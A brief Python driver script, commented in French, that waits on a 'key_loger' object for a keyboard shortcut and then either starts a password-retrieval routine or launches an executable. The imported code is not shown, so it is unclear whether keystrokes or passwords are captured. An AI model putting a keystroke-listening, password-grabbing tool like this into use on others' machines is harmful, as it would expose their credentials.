from feature_class import *

mode = "exe"

for i in range(2):
    key_loger.cherche() # attend l'activation du shortcut
    key_loger.pas_trouver = True
    if mode == "mdp":
        get_password_secure().start()
    elif mode == "exe":
        executable().execute()